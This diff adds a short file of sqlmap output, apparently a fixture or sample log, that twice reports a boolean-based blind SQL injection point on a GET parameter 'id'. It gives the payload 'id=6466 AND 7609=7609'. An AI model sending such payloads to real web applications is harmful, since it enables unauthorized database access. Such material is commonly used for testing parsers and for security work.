@@ -1,0 +1,16 @@
+sqlmap identified the following injection points with a total of 265 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: hack.com=%00.&id=6466 AND 7609=7609
+---
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: hack.com=%00.&id=6466 AND 7609=7609
+---
